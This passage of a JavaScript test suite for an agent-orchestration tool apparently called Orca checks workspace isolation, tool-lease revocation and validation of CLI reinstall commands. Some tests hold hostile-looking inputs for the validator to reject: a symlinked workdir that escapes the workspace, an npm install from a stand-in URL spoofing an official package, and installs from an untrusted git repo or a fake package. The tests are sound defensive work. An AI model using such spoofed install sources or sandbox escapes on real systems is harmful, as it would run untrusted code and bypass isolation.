      }, { approved: true, actor: 'test' }),
      (error) => error.status === 422,
    );

    const outsideDir = await fs.mkdtemp(path.join(os.tmpdir(), 'orca-outside-workdir-'));
    const symlinkWorkdir = path.join(sessionRecord.worktreeRoot, 'link-outside');
    await fs.symlink(outsideDir, symlinkWorkdir, 'dir');
    try {
      assert.throws(
        () => registry.createLane(session.id, {
          title: 'Symlink escaping workspace lane',
          executorType: 'codex',
          workdir: 'link-outside',
          mcpToolIds: [],
        }, { approved: true, actor: 'test' }),
        (error) => error.status === 422 && /resolves outside/.test(error.message),
      );
      assert.throws(
        () => registry.createLane(session.id, {
          title: 'Nested symlink escaping workspace lane',
          executorType: 'codex',
          workdir: 'link-outside/pwn',
          mcpToolIds: [],
        }, { approved: true, actor: 'test' }),
        (error) => error.status === 422 && /resolves outside/.test(error.message),
      );
      await assert.rejects(
        () => fs.stat(path.join(outsideDir, 'pwn')),
        (error) => error.code === 'ENOENT',
      );

      const { CliExecutorAdapter } = await import('../src/executor/cli-adapter.js');
      const adapter = new CliExecutorAdapter('node', {
        defaultBinary: process.execPath,
        allowedBinaries: [process.execPath],
        defaultWorkingDir: process.cwd(),
        workdirRoots: [process.cwd()],
      });
      await assert.rejects(
        () => adapter._resolveWorkdir(symlinkWorkdir),
        /resolves outside allowed execution roots/,
      );
    } finally {
      await fs.rm(outsideDir, { recursive: true, force: true });
    }
  } finally {
    await cleanup();
  }
});

test('Unknown executor adapters report unsupported errors', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const adapter = registry.getExecutorForType('orchestrator');
    const result = await adapter.start({ id: 'lane-unknown', projectId: 'p', sessionId: 's' });
    assert.equal(result.accepted, false);
    assert.equal(result.reason, 'orchestrator executor is not supported.');
  } finally {
    await cleanup();
  }
});

test('executor CLI info and managed reinstall require approval', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CLAUDE_BINARY: process.env.ORCA_CLAUDE_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CLAUDE_REINSTALL_COMMAND: process.env.ORCA_CLAUDE_REINSTALL_COMMAND,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CLAUDE_BINARY = '/usr/bin/claude';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = '["npm","install","-g","--yes","codex-cli"]';
    process.env.ORCA_CLAUDE_REINSTALL_COMMAND = '["npm","install","-g","--yes","claude-cli"]';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const profiles = registry.getExecutorProfiles();
      assert.equal(profiles.codex.defaultBinary, '/usr/bin/codex');
      assert.equal(profiles.claude.defaultBinary, '/usr/bin/claude');
      assert.equal(profiles['gemini-cli'].defaultBinary, 'gemini');
      assert.equal(profiles['composer-cli'].defaultBinary, 'cursor-agent');

      const codexInfo = registry.getExecutorCliInfo('codex');
      assert.equal(codexInfo.type, 'codex');
      assert.equal(codexInfo.binary, '/usr/bin/codex');
      assert.equal(codexInfo.reinstall.available, true);
      assert.equal(codexInfo.reinstall.command[0], 'npm');

      const geminiInfo = registry.getExecutorCliInfo('gemini-cli');
      assert.equal(geminiInfo.type, 'gemini-cli');
      assert.equal(geminiInfo.binary, 'gemini');
      assert.equal(geminiInfo.reinstall.available, false);

      const dryRun = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(dryRun.executed, false);
      assert.equal(dryRun.command[0], 'npm');

      await assert.rejects(
        () => registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: false,
          execute: false,
        }),
        (error) => error.status === 409,
      );
    } finally {
    await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor capabilities are available for every supported executor and snapshotted on lanes', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const matrix = registry.getExecutorCapabilitiesMatrix();
    assert.equal(matrix.mock.invocation.canRunAsOrchestrator, true);
    assert.equal(matrix.codex.invocation.canRunAsExecutor, true);
    assert.equal(matrix.claude.controls.permissions.supported, true);
    assert.equal(Array.isArray(matrix.claude.controls.intelligence.values), true);
    assert.equal(matrix['gemini-cli']?.invocation.canRunAsOrchestrator, true);

    const project = registry.createProject({ name: 'Capability Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Capability Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'Capability lane',
      executorType: 'claude',
      taskPrompt: 'Inspect detected capabilities.',
      permissionsProfile: 'plan',
      intelligenceProfile: 'high',
      sharedWorktree: true,
    }, { actor: 'test', approved: true });

    assert.equal(lane.executorCapabilities.type, 'claude');
    assert.equal(lane.executorCapabilities.invocation.canRunAsOrchestrator, true);
    assert.equal(lane.executorCapabilities.invocation.canRunAsExecutor, true);
    assert.equal(Array.isArray(lane.executorCapabilities.controls.permissions.values), true);
  } finally {
    await cleanup();
  }
});

test('lane controls update model, mode, intelligence, and audit event', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Lane Controls Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Lane Controls Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'Controlled lane',
      executorType: 'mock',
      taskPrompt: 'Run with controls.',
      sharedWorktree: true,
    }, { actor: 'test', approved: true });

    assert.throws(() => registry.updateLaneControls(lane.id, {
      model: 'gpt-5',
      permissionsProfile: 'plan',
      intelligenceProfile: 'high',
    }, { actor: 'test', approved: false }), (error) => error.status === 409);

    const updated = registry.updateLaneControls(lane.id, {
      model: 'gpt-5',
      permissionsProfile: 'auto-edit',
      intelligenceProfile: 'max',
    }, { actor: 'test', approved: true });

    assert.equal(updated.model, 'gpt-5');
    assert.equal(updated.permissionsProfile, 'auto-edit');
    assert.equal(updated.intelligenceProfile, 'max');
    assert.equal(updated.agentEvents.some((event) => event.type === 'agent.controls_updated'), true);
    assert.equal(registry.auditEvents.some((event) => event.type === 'lane_controls_updated' && event.laneId === lane.id), true);
  } finally {
    await cleanup();
  }
});

test('lane lifecycle log appends remain capped', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Lane Log Cap Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Lane Log Cap Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, {
      title: 'Log capped lane',
      executorType: 'mock',
      taskPrompt: 'Keep logs bounded.',
    }, { actor: 'test', approved: true });
    const stored = registry.getLane(lane.id);
    stored.logs = Array.from({ length: 2005 }, (_, index) => ({
      at: new Date(0).toISOString(),
      message: `old log ${index}`,
    }));

    const updated = registry.updateLaneControls(lane.id, {
      model: 'gpt-5',
      permissionsProfile: 'auto-edit',
      intelligenceProfile: 'max',
    }, { actor: 'test', approved: true });

    assert.equal(updated.logs.length, 2000);
    assert.equal(updated.logs.at(-1).message.includes('Lane controls updated'), true);
  } finally {
    await cleanup();
  }
});

test('lane-scoped tool leases are revoked when Orca-authored lanes stop being live', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  const assertRevoked = (token, laneId, reason) => {
    assert.throws(
      () => registry.validateToolLease(token, { toolId: 'lane.get', laneId }),
      (error) => error.status === 401 && /revoked/i.test(error.message),
    );
    assert.equal(
      registry.listToolLeases({ activeOnly: true }).some((lease) => lease.laneId === laneId),
      false,
    );
    assert.equal(
      registry.auditEvents.some((event) =>
        event.type === 'agent_tool_lease_revoked'
        && event.laneId === laneId
        && event.evidence?.reason === reason),
      true,
    );
  };

  try {
    const project = registry.createProject({ name: 'Lane Lease Cleanup' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Lane Lease Cleanup Session' }, { actor: 'test', approved: true });

    const completed = registry.createLane(session.id, {
      title: 'completed lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });
    const completedToken = registry.ensureLaneToolLease(registry.getLane(completed.id)).ORCA_TOOL_LEASE_TOKEN;
    assert.ok(completedToken);
    assert.equal(registry.validateToolLease(completedToken, { toolId: 'lane.get', laneId: completed.id }).active, true);
    registry.markLaneCompleted(registry.getLane(completed.id));
    assert.equal(registry.laneRuntimeEnv.has(completed.id), false);
    assertRevoked(completedToken, completed.id, 'lane_completed');

    const failed = registry.createLane(session.id, {
      title: 'failed lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });
    const failedToken = registry.ensureLaneToolLease(registry.getLane(failed.id)).ORCA_TOOL_LEASE_TOKEN;
    registry.markLaneFailed(registry.getLane(failed.id), 'boom', 'test');
    assert.equal(registry.laneRuntimeEnv.has(failed.id), false);
    assertRevoked(failedToken, failed.id, 'lane_failed');

    const stopped = registry.createLane(session.id, {
      title: 'stopped lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });
    const stoppedToken = registry.ensureLaneToolLease(registry.getLane(stopped.id)).ORCA_TOOL_LEASE_TOKEN;
    registry.getLane(stopped.id).state = 'running';
    await registry.stopLane(stopped.id, { actor: 'test', approved: true });
    assert.equal(registry.laneRuntimeEnv.has(stopped.id), false);
    assertRevoked(stoppedToken, stopped.id, 'lane_stopped');

    const retried = registry.retryLane(failed.id, { actor: 'test', approved: true });
    assert.equal(retried.state, 'queued');
    const freshToken = registry.ensureLaneToolLease(registry.getLane(failed.id)).ORCA_TOOL_LEASE_TOKEN;
    assert.ok(freshToken);
    assert.notEqual(freshToken, failedToken);
    assert.equal(registry.validateToolLease(freshToken, { toolId: 'lane.get', laneId: failed.id }).active, true);

    const stale = registry.createLane(session.id, {
      title: 'stale env lane',
      executorType: 'mock',
    }, { actor: 'test', approved: true });
    const staleEnv = registry.ensureLaneToolLease(registry.getLane(stale.id));
    registry.revokeToolLeasesForLane(stale.id, { actor: 'test', reason: 'manual_stale', persist: false });
    assert.equal(registry.laneRuntimeEnv.has(stale.id), true);
    const refreshedEnv = registry.ensureLaneToolLease(registry.getLane(stale.id));
    assert.notEqual(refreshedEnv.ORCA_TOOL_LEASE_TOKEN, staleEnv.ORCA_TOOL_LEASE_TOKEN);
    assert.equal(
      registry.validateToolLease(refreshedEnv.ORCA_TOOL_LEASE_TOKEN, { toolId: 'lane.get', laneId: stale.id }).active,
      true,
    );
  } finally {
    await cleanup();
  }
});

test('orchestrator thread messages are capped when restored or appended', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();

  try {
    const project = registry.createProject({ name: 'Thread Cap Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Thread Cap Session' }, { actor: 'test', approved: true });
    const storedSession = registry.getSession(session.id);
    storedSession.orchestratorThread = {
      id: 'thread-cap',
      messages: Array.from({ length: 505 }, (_, index) => ({
        id: `message-${index}`,
        role: 'user',
        content: `message ${index}`,
        createdAt: new Date(0).toISOString(),
      })),
      laneIds: [],
      activeLaneId: null,
      executorType: 'mock',
      updatedAt: new Date(0).toISOString(),
    };

    const restored = registry.getOrchestratorThread(session.id);
    assert.equal(restored.messages.length, 500);
    assert.equal(restored.messages[0].id, 'message-5');

    const thread = registry.ensureOrchestratorThread(storedSession);
    registry.appendOrchestratorThreadMessage(thread, {
      id: 'message-new',
      role: 'assistant',
      content: 'new message',
      createdAt: new Date().toISOString(),
    });

    const appended = registry.getOrchestratorThread(session.id);
    assert.equal(appended.messages.length, 500);
    assert.equal(appended.messages.at(-1).id, 'message-new');
  } finally {
    await cleanup();
  }
});

test('executor CLI reinstall execute mode requires confirmation', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_PACKAGES: process.env.ORCA_CODEX_REINSTALL_PACKAGES,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes codex-cli';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      await assert.rejects(
        () => registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: true,
          execute: true,
        }),
        (error) => error.status === 409,
      );

      const planned = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(planned.executed, false);
      assert.equal(planned.command[0], 'npm');
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall has secure official-package defaults when no override is provided', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CLAUDE_BINARY: process.env.ORCA_CLAUDE_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CLAUDE_REINSTALL_COMMAND: process.env.ORCA_CLAUDE_REINSTALL_COMMAND,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CLAUDE_BINARY = '/usr/bin/claude';
    delete process.env.ORCA_CODEX_REINSTALL_COMMAND;
    delete process.env.ORCA_CLAUDE_REINSTALL_COMMAND;

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const codexInfo = registry.getExecutorCliInfo('codex');
      const claudeInfo = registry.getExecutorCliInfo('claude');
      assert.equal(codexInfo.reinstall.available, true);
      assert.equal(codexInfo.reinstall.command.includes('npm'), true);
      assert.equal(codexInfo.reinstall.command.includes('@openai/codex'), true);
      assert.equal(claudeInfo.reinstall.available, true);
      assert.equal(claudeInfo.reinstall.command.includes('npm'), true);
      assert.equal(claudeInfo.reinstall.command.includes('@anthropic/claude-code'), true);
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall command validation is executor-specific and safe', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CLAUDE_BINARY: process.env.ORCA_CLAUDE_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CLAUDE_REINSTALL_COMMAND: process.env.ORCA_CLAUDE_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_PACKAGES: process.env.ORCA_CODEX_REINSTALL_PACKAGES,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CLAUDE_BINARY = '/usr/bin/claude';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes codex-cli';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const validInfo = registry.getExecutorCliInfo('codex');
      assert.equal(validInfo.reinstall.available, true);
      assert.equal(validInfo.reinstall.command[0], 'npm');

      const planned = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(planned.executed, false);
      assert.equal(planned.command[0], 'npm');
      assert.equal(planned.command.includes('codex-cli'), true);

      process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install codex-fake';
      const blocked = await withIsolatedRegistry();
      try {
        const blockedInfo = blocked.registry.getExecutorCliInfo('codex');
        assert.equal(blockedInfo.reinstall.available, false);
        await assert.rejects(
          () => blocked.registry.runExecutorCliReinstall('codex', {
            actor: 'test',
            approved: true,
            execute: false,
          }),
          (error) => error.status === 422,
        );
      } finally {
        await blocked.cleanup();
      }

      process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes codex-cli';
      const info = registry.getExecutorCliInfo('codex');
      assert.equal(info.reinstall.available, true);

      const plannedSecond = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(plannedSecond.executed, false);
      assert.equal(plannedSecond.command[0], 'npm');
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall package allowlist can be overridden per executor', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_PACKAGES: process.env.ORCA_CODEX_REINSTALL_PACKAGES,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes codex-cli';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const defaultInfo = registry.getExecutorCliInfo('codex');
      assert.equal(defaultInfo.reinstall.available, true);

      process.env.ORCA_CODEX_REINSTALL_PACKAGES = '@openai/codex';
      const customBlocked = await withIsolatedRegistry();
      try {
        const customBlockedInfo = customBlocked.registry.getExecutorCliInfo('codex');
        assert.equal(customBlockedInfo.reinstall.available, false);
        await assert.rejects(
          () => customBlocked.registry.runExecutorCliReinstall('codex', {
            actor: 'test',
            approved: true,
            execute: false,
          }),
          (error) => error.status === 422,
        );
      } finally {
        await customBlocked.cleanup();
      }

      process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes @openai/codex';
      process.env.ORCA_CODEX_REINSTALL_PACKAGES = '@openai/codex';
      const scopedAllowed = await withIsolatedRegistry();
      try {
        const scopedInfo = scopedAllowed.registry.getExecutorCliInfo('codex');
        assert.equal(scopedInfo.reinstall.available, true);
        const scopedPlan = await scopedAllowed.registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: true,
          execute: false,
        });
        assert.equal(scopedPlan.executed, false);
        assert.equal(scopedPlan.command.includes('@openai/codex'), true);
      } finally {
        await scopedAllowed.cleanup();
      }
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall rejects URL-based package spec spoofing', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_PACKAGES: process.env.ORCA_CODEX_REINSTALL_PACKAGES,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes https://example.com/@openai/codex';
    process.env.ORCA_CODEX_REINSTALL_PACKAGES = '@openai/codex';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const info = registry.getExecutorCliInfo('codex');
      assert.equal(info.reinstall.available, false);
      await assert.rejects(
        () => registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: true,
          execute: false,
        }),
        (error) => error.status === 422,
      );
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall supports safe override command profiles and manager verbs', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes codex-cli';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const defaultPlan = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(defaultPlan.command[0], 'npm');
    assert.equal(defaultPlan.command.includes('codex-cli'), true);

      const overridePlan = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
        command: 'pnpm add -g codex-cli',
      });
      assert.equal(overridePlan.command[0], 'pnpm');
      assert.equal(overridePlan.command.includes('codex-cli'), true);

      const brewCodexPlan = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
        command: 'brew reinstall --cask codex',
      });
      assert.equal(brewCodexPlan.command[0], 'brew');
      assert.equal(brewCodexPlan.command.includes('codex'), true);

      const brewClaudePlan = await registry.runExecutorCliReinstall('claude', {
        actor: 'test',
        approved: true,
        execute: false,
        command: 'brew install anthropic-ai/tap/claude',
      });
      assert.equal(brewClaudePlan.command[0], 'brew');
      assert.equal(brewClaudePlan.command.includes('anthropic-ai/tap/claude'), true);

      await assert.rejects(
        () => registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: true,
          execute: false,
          command: 'npm uninstall codex-cli',
        }),
        (error) => error.status === 422,
      );

      await assert.rejects(
        () => registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: true,
          execute: false,
          command: 'npm install lodash',
        }),
        (error) => error.status === 422,
      );

      await assert.rejects(
        () => registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: true,
          execute: false,
          command: 'brew install --cask fake-codex',
        }),
        (error) => error.status === 422,
      );
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall supports trusted source-based reinstall commands', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_SOURCE_REPOS: process.env.ORCA_CODEX_REINSTALL_SOURCE_REPOS,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes git+https://github.com/openai/codex.git';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const plan = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(plan.executed, false);
      assert.equal((plan.command || []).join(' ').includes('git+https://github.com/openai/codex.git'), true);
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall rejects untrusted source-based reinstall commands', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_SOURCE_REPOS: process.env.ORCA_CODEX_REINSTALL_SOURCE_REPOS,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes git+https://github.com/untrusted/source.git';
    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      await assert.rejects(
        () => registry.runExecutorCliReinstall('codex', {
          actor: 'test',
          approved: true,
          execute: false,
        }),
        (error) => error.status === 422,
      );
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall can use a configured source repo allowlist override', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_SOURCE_REPOS: process.env.ORCA_CODEX_REINSTALL_SOURCE_REPOS,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    process.env.ORCA_CODEX_REINSTALL_SOURCE_REPOS = 'my-org/codex-fork,openai/codex';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes git+https://github.com/my-org/codex-fork.git';

    const { registry, cleanup } = await withIsolatedRegistry();
    try {
      const plan = await registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(plan.executed, false);
      assert.equal((plan.command || []).join(' ').includes('git+https://github.com/my-org/codex-fork.git'), true);
    } finally {
      await cleanup();
    }
  } finally {
    restore();
  }
});

test('executor CLI reinstall preference for source commands is respected and surfaced', async () => {
  const restore = restoreEnv({
    ORCA_CODEX_BINARY: process.env.ORCA_CODEX_BINARY,
    ORCA_CODEX_REINSTALL_COMMAND: process.env.ORCA_CODEX_REINSTALL_COMMAND,
    ORCA_CODEX_REINSTALL_SOURCE_REPOS: process.env.ORCA_CODEX_REINSTALL_SOURCE_REPOS,
    ORCA_CODEX_REINSTALL_PREFER_SOURCE: process.env.ORCA_CODEX_REINSTALL_PREFER_SOURCE,
  });

  try {
    process.env.ORCA_CODEX_BINARY = '/usr/bin/codex';
    delete process.env.ORCA_CODEX_REINSTALL_COMMAND;
    process.env.ORCA_CODEX_REINSTALL_SOURCE_REPOS = 'my-org/codex-fork,openai/codex';
    process.env.ORCA_CODEX_REINSTALL_PREFER_SOURCE = 'true';

    const preferred = await withIsolatedRegistry();
    try {
      const preferredInfo = preferred.registry.getExecutorCliInfo('codex');
      assert.equal(preferredInfo.reinstall.preferSource, true);
      assert.equal(preferredInfo.reinstall.sourceRepos[0], 'my-org/codex-fork');
      assert.equal(
        (preferredInfo.reinstall.command || []).join(' ').includes('git+https://github.com/my-org/codex-fork.git'),
        true,
      );
      const preferredPlan = await preferred.registry.runExecutorCliReinstall('codex', {
        actor: 'test',
        approved: true,
        execute: false,
      });
      assert.equal(preferredPlan.executed, false);
      assert.equal(
        (preferredPlan.command || []).join(' ').includes('git+https://github.com/my-org/codex-fork.git'),
        true,
      );
    } finally {
      await preferred.cleanup();
    }

    process.env.ORCA_CODEX_REINSTALL_PREFER_SOURCE = 'false';
    process.env.ORCA_CODEX_REINSTALL_COMMAND = 'npm install --yes @openai/codex';
    const fallback = await withIsolatedRegistry();
    try {
      const fallbackInfo = fallback.registry.getExecutorCliInfo('codex');
      assert.equal(fallbackInfo.reinstall.preferSource, false);
      assert.equal(
        (fallbackInfo.reinstall.command || []).includes('npm'),
        true,
      );
      assert.equal(
        (fallbackInfo.reinstall.command || []).includes('@openai/codex'),
        true,
      );
      assert.equal(
        (fallbackInfo.reinstall.sourceCommand || []).join(' ').includes('git+https://github.com/my-org/codex-fork.git'),
        true,
      );
    } finally {
      await fallback.cleanup();
    }
  } finally {
    restore();
  }
});

test('MCP config is generated per-lane with safe path and executor-specific shape', async () => {
  const previousEnv = { ...process.env };
  const restore = restoreEnv(previousEnv);
  process.env.ORCA_CODEX_ALLOWED_BINARIES = 'codex';
  process.env.ORCA_CLAUDE_ALLOWED_BINARIES = 'claude';
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'MCP Config Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'MCP Config Session' }, { actor: 'test', approved: true });

    await registry.createMcpTool({
      name: 'demo-tool',
      command: 'node',
      args: ['-v'],
      scope: ['all'],
      enabled: true,
    }, { actor: 'test', approved: true });

    const lane = registry.createLane(session.id, {
      title: 'MCP lane',
      executorType: 'codex',
      command: 'codex --version',
      mcpToolIds: ['demo-tool'],
    }, { actor: 'test', approved: true });

    const adapter = registry.getExecutorForType('codex');
    const runtimeDir = path.join(process.cwd(), 'artifacts', session.id, lane.id);
    await fs.mkdir(runtimeDir, { recursive: true });
    const { configPath, servers } = await adapter._buildMcpConfig(runtimeDir, registry.getLane(lane.id));
    assert.equal(typeof configPath, 'string');
    assert.equal(configPath.startsWith(runtimeDir), true);
    assert.equal(typeof servers, 'object');
    const raw = await fs.readFile(configPath, 'utf8');
    const parsed = JSON.parse(raw);
    assert.equal(parsed.laneId, lane.id);
    assert.equal(parsed.executorType, 'codex');
    assert.equal(Object.prototype.hasOwnProperty.call(parsed.mcpServers, 'demo-tool'), true);
    assert.equal(parsed.mcpServers['demo-tool'].command, 'node');
    assert.deepEqual(parsed.mcpServers['demo-tool'].args, ['-v']);
    assert.equal(parsed.tools.length, 1);
    assert.equal(Object.keys(parsed.mcpServers).length, 1);

    const claudeLane = registry.createLane(session.id, {
      title: 'Claude MCP lane',
      executorType: 'claude',
      command: 'claude --version',
      mcpToolIds: ['demo-tool'],
    }, { actor: 'test', approved: true });
    const claudeAdapter = registry.getExecutorForType('claude');
    const claudeRuntimeDir = path.join(process.cwd(), 'artifacts', session.id, claudeLane.id);
    await fs.mkdir(claudeRuntimeDir, { recursive: true });
    const { configPath: claudeConfigPath } = await claudeAdapter._buildMcpConfig(claudeRuntimeDir, registry.getLane(claudeLane.id));
    const claudeParsed = JSON.parse(await fs.readFile(claudeConfigPath, 'utf8'));
    assert.equal(claudeParsed.executorType, 'claude');
    assert.equal(claudeParsed.tools.length, 1);
    assert.equal(Object.keys(claudeParsed.mcpServers).length, 1);
    assert.deepEqual(claudeParsed.mcpServers['demo-tool'].args, ['-v']);

    const noToolLane = registry.createLane(session.id, {
      title: 'No tool lane',
      executorType: 'codex',
      command: 'codex --version',
    }, { actor: 'test', approved: true });
    const adapter2 = registry.getExecutorForType('codex');
    const runtimeDir2 = path.join(process.cwd(), 'artifacts', session.id, noToolLane.id);
    await fs.mkdir(runtimeDir2, { recursive: true });
    const noConfig = await adapter2._buildMcpConfig(runtimeDir2, registry.getLane(noToolLane.id));
    assert.equal(noConfig.configPath, null);
  } finally {
    await cleanup();
    restore();
  }
});

test('CLI executor writes raw terminal stdout and stderr artifacts', async () => {
  const previous = {
    ORCA_ENABLE_CUSTOM_CLI: process.env.ORCA_ENABLE_CUSTOM_CLI,
    ORCA_CLI_BINARY: process.env.ORCA_CLI_BINARY,
    ORCA_CLI_ALLOWED_BINARIES: process.env.ORCA_CLI_ALLOWED_BINARIES,
    ORCA_CLI_WORKDIR_ROOTS: process.env.ORCA_CLI_WORKDIR_ROOTS,
  };
  const restore = restoreEnv(previous);
  process.env.ORCA_ENABLE_CUSTOM_CLI = 'true';
  process.env.ORCA_CLI_BINARY = process.execPath;
  process.env.ORCA_CLI_ALLOWED_BINARIES = process.execPath;
  process.env.ORCA_CLI_WORKDIR_ROOTS = process.cwd();

  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const { createExecutorAdapter } = await import('../src/executor-factory.js');
    const adapter = createExecutorAdapter('cli', {
      onLog: (lane, message) => registry.appendLaneLog(lane, message),
      onComplete: () => {},
